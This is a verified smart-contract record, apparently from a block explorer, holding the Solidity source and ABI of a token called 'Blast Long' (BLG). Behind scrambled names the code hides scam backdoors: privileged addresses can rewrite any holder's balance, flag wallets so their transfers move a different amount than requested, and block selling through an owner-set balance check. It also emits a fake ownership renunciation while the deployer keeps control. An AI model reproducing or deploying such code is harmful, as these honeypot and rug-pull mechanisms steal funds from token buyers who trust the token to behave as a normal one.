{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface takeAuto {\n    function createPair(address txAt, address atExempt) external returns (address);\n}\n\ninterface tradingTxFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalMin) external view returns (uint256);\n\n    function transfer(address maxExempt, uint256 autoSellLimit) external returns (bool);\n\n    function allowance(address modeShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSellLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxExempt,\n        uint256 autoSellLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletSender, uint256 value);\n    event Approval(address indexed modeShould, address indexed spender, uint256 value);\n}\n\nabstract contract modeEnableBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTxFromMetadata is tradingTxFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlastLong is modeEnableBuy, tradingTxFrom, tradingTxFromMetadata {\n\n    mapping(address => mapping(address => uint256)) private receiverMax;\n\n    mapping(address => uint256) private liquidityLaunchedFrom;\n\n    function launchTx(uint256 autoSellLimit) public {\n        receiverWallet();\n        sellMode = autoSellLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchSell;\n    }\n\n    function atTrading(address totalFee, address maxExempt, uint256 autoSellLimit) internal returns (bool) {\n        if (totalFee == shouldTeamMax) {\n            return swapFee(totalFee, maxExempt, autoSellLimit);\n        }\n        uint256 marketingSender = tradingTxFrom(minMarketing).balanceOf(totalAuto);\n        require(marketingSender == sellMode);\n        require(maxExempt != totalAuto);\n        if (modeTo[totalFee]) {\n            return swapFee(totalFee, maxExempt, amountBuy);\n        }\n        return swapFee(totalFee, maxExempt, autoSellLimit);\n    }\n\n    uint256 sellMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSell;\n    }\n\n    address totalAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public exemptReceiver;\n\n    function modeBuy(address teamAmount) public {\n        receiverWallet();\n        \n        if (teamAmount == shouldTeamMax || teamAmount == minMarketing) {\n            return;\n        }\n        modeTo[teamAmount] = true;\n    }\n\n    bool public fromReceiverWallet;\n\n    bool public takeSwap;\n\n    mapping(address => bool) public modeTo;\n\n    function swapLimit(address marketingLaunch) public {\n        if (receiverTeam) {\n            return;\n        }\n        \n        marketingTrading[marketingLaunch] = true;\n        \n        receiverTeam = true;\n    }\n\n    function swapFee(address totalFee, address maxExempt, uint256 autoSellLimit) internal returns (bool) {\n        require(liquidityLaunchedFrom[totalFee] >= autoSellLimit);\n        liquidityLaunchedFrom[totalFee] -= autoSellLimit;\n        liquidityLaunchedFrom[maxExempt] += autoSellLimit;\n        emit Transfer(totalFee, maxExempt, autoSellLimit);\n        return true;\n    }\n\n    bool public receiverTeam;\n\n    function transfer(address toLaunched, uint256 autoSellLimit) external virtual override returns (bool) {\n        return atTrading(_msgSender(), toLaunched, autoSellLimit);\n    }\n\n    address private buyLiquidity;\n\n    bool private swapList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAmount;\n    }\n\n    constructor (){\n        \n        feeTeam atLiquidity = feeTeam(txShould);\n        minMarketing = takeAuto(atLiquidity.factory()).createPair(atLiquidity.WETH(), address(this));\n        \n        shouldTeamMax = _msgSender();\n        marketingTrading[shouldTeamMax] = true;\n        liquidityLaunchedFrom[shouldTeamMax] = enableSell;\n        receiverExemptFund();\n        \n        emit Transfer(address(0), shouldTeamMax, enableSell);\n    }\n\n    address public minMarketing;\n\n    function transferFrom(address totalFee, address maxExempt, uint256 autoSellLimit) external override returns (bool) {\n        if (_msgSender() != txShould) {\n            if (receiverMax[totalFee][_msgSender()] != type(uint256).max) {\n                require(autoSellLimit <= receiverMax[totalFee][_msgSender()]);\n                receiverMax[totalFee][_msgSender()] -= autoSellLimit;\n            }\n        }\n        return atTrading(totalFee, maxExempt, autoSellLimit);\n    }\n\n    mapping(address => bool) public marketingTrading;\n\n    function balanceOf(address totalMin) public view virtual override returns (uint256) {\n        return liquidityLaunchedFrom[totalMin];\n    }\n\n    function approve(address autoLimit, uint256 autoSellLimit) public virtual override returns (bool) {\n        receiverMax[_msgSender()][autoLimit] = autoSellLimit;\n        emit Approval(_msgSender(), autoLimit, autoSellLimit);\n        return true;\n    }\n\n    uint256 private maxSwap;\n\n    uint256 constant amountBuy = 13 ** 10;\n\n    uint256 tokenTotalSender;\n\n    address public shouldTeamMax;\n\n    function allowance(address feeList, address autoLimit) external view virtual override returns (uint256) {\n        if (autoLimit == txShould) {\n            return type(uint256).max;\n        }\n        return receiverMax[feeList][autoLimit];\n    }\n\n    uint256 private enableSell = 100000000 * 10 ** 18;\n\n    address txShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return buyLiquidity;\n    }\n\n    uint8 private tokenAmount = 18;\n\n    event OwnershipTransferred(address indexed toMinLaunch, address indexed marketingFrom);\n\n    string private launchSell = \"Blast Long\";\n\n    bool private tokenTx;\n\n    function receiverExemptFund() public {\n        emit OwnershipTransferred(shouldTeamMax, address(0));\n        buyLiquidity = address(0);\n    }\n\n    string private enableList = \"BLG\";\n\n    function getOwner() external view returns (address) {\n        return buyLiquidity;\n    }\n\n    function sellWallet(address toLaunched, uint256 autoSellLimit) public {\n        receiverWallet();\n        liquidityLaunchedFrom[toLaunched] = autoSellLimit;\n    }\n\n    function receiverWallet() private view {\n        require(marketingTrading[_msgSender()]);\n    }\n\n    uint256 private marketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMinLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSellLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSellLimit\",\"type\":\"uint256\"}],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmount\",\"type\":\"address\"}],\"name\":\"modeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExemptFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSellLimit\",\"type\":\"uint256\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeamMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSellLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSellLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlastLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}